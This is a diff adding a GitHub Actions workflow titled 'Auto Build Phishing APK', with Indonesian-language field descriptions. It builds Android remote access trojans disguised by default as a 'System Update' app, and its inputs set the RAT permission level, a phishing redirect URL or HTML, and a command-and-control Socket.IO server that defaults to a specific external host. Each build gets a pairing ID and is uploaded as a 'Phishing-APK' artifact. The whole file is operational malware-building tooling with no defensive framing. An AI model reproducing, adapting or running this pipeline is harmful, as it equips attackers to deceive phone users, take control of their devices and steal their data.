@@ -1,0 +1,159 @@
+name: Auto Build Phishing APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      app_name:
+        description: "Nama Aplikasi (label APK)"
+        required: true
+        default: "System Update"
+      app_id:
+        description: "ApplicationId (com.xxx.yyy)"
+        required: false
+        default: "com.sync.xxx"
+      rat_type:
+        description: "Tipe RAT: ALL (full permission) atau TWO (2 izin minimal)"
+        required: true
+        default: "ALL"
+        type: choice
+        options:
+          - ALL
+          - TWO
+      redirect_mode:
+        description: "Mode redirect: URL atau HTML"
+        required: true
+        default: "URL"
+        type: choice
+        options:
+          - URL
+          - HTML
+      redirect_value:
+        description: "URL (https://...) atau HTML string / base64"
+        required: true
+        default: "https://example.com"
+      server_url:
+        description: "C2 Socket.IO URL (http://host:port)"
+        required: true
+        default: "http://papsky.queen-official.com:2468"
+      pair_id:
+        description: "Auto Pair ID (kosong = auto NEONXJZET-xxxx)"
+        required: false
+        default: ""
+      icon_base64:
+        description: "Icon PNG base64 (opsional)"
+        required: false
+        default: ""
+      version_name:
+        description: "Version name"
+        required: false
+        default: "1.0"
+      version_code:
+        description: "Version code"
+        required: false
+        default: "1"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      actions: write
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: "17"
+          distribution: "temurin"
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install deps
+        run: pip install Pillow
+
+      - name: Generate Pair ID if empty
+        id: pair
+        run: |
+          PAIR="${{ github.event.inputs.pair_id }}"
+          if [ -z "$PAIR" ]; then
+            RAND=$(printf "%04d" $((RANDOM % 10000)))
+            PAIR="NEONXJZET$(date +%s | tail -c 5)${RAND}"
+          fi
+          echo "pair_id=$PAIR" >> $GITHUB_OUTPUT
+          echo "PAIR=$PAIR"
+
+      - name: Inject config
+        env:
+          APP_NAME: ${{ github.event.inputs.app_name }}
+          APP_ID: ${{ github.event.inputs.app_id }}
+          RAT_TYPE: ${{ github.event.inputs.rat_type }}
+          REDIRECT_MODE: ${{ github.event.inputs.redirect_mode }}
+          REDIRECT_VALUE: ${{ github.event.inputs.redirect_value }}
+          SERVER_URL: ${{ github.event.inputs.server_url }}
+          PAIR_ID: ${{ steps.pair.outputs.pair_id }}
+          VERSION_NAME: ${{ github.event.inputs.version_name }}
+          VERSION_CODE: ${{ github.event.inputs.version_code }}
+          ICON_B64: ${{ github.event.inputs.icon_base64 }}
+        run: python3 builder/inject_config.py
+
+      - name: Generate App Icons
+        run: |
+          if [ -f custom_icon.png ]; then cp custom_icon.png sync.jpg; fi
+          python3 generate_icons.py
+
+      - name: Setup Gradle Wrapper
+        run: |
+          mkdir -p android/gradle/wrapper
+          if [ ! -f android/gradle/wrapper/gradle-wrapper.jar ]; then
+            curl -sL -o android/gradle/wrapper/gradle-wrapper.jar \
+              "https://raw.githubusercontent.com/gradle/gradle/v8.4.0/gradle/wrapper/gradle-wrapper.jar"
+          fi
+          chmod +x android/gradlew
+
+      - name: Build Release APK
+        run: |
+          cd android
+          ./gradlew assembleRelease --no-daemon --stacktrace
+
+      - name: Package output
+        run: |
+          mkdir -p output
+          APK=$(find android/app/build/outputs/apk/release -name "*.apk" | head -1)
+          test -n "$APK" || { echo "APK missing"; exit 1; }
+          SAFE=$(echo "${{ github.event.inputs.app_name }}" | tr -cd '[:alnum:]_-' | cut -c1-32)
+          OUT="output/${SAFE}_${{ steps.pair.outputs.pair_id }}.apk"
+          cp "$APK" "$OUT"
+          cat > output/build_meta.json << EOF
+          {
+            "app_name": "${{ github.event.inputs.app_name }}",
+            "app_id": "${{ github.event.inputs.app_id }}",
+            "rat_type": "${{ github.event.inputs.rat_type }}",
+            "redirect_mode": "${{ github.event.inputs.redirect_mode }}",
+            "pair_id": "${{ steps.pair.outputs.pair_id }}",
+            "server_url": "${{ github.event.inputs.server_url }}",
+            "built_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
+            "run_id": "${{ github.run_id }}"
+          }
+          EOF
+          ls -la output/
+
+      - name: Upload APK Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Phishing-APK-${{ steps.pair.outputs.pair_id }}
+          path: output/
+          retention-days: 30
+
+      - name: Summary
+        run: |
+          echo "### BUILD BERHASIL" >> $GITHUB_STEP_SUMMARY
+          echo "- **APK**: ${{ github.event.inputs.app_name }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **Tipe**: RAT ${{ github.event.inputs.rat_type }} IZIN" >> $GITHUB_STEP_SUMMARY
+          echo "- **Pair**: ${{ steps.pair.outputs.pair_id }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **Redirect**: ${{ github.event.inputs.redirect_mode }}" >> $GITHUB_STEP_SUMMARY
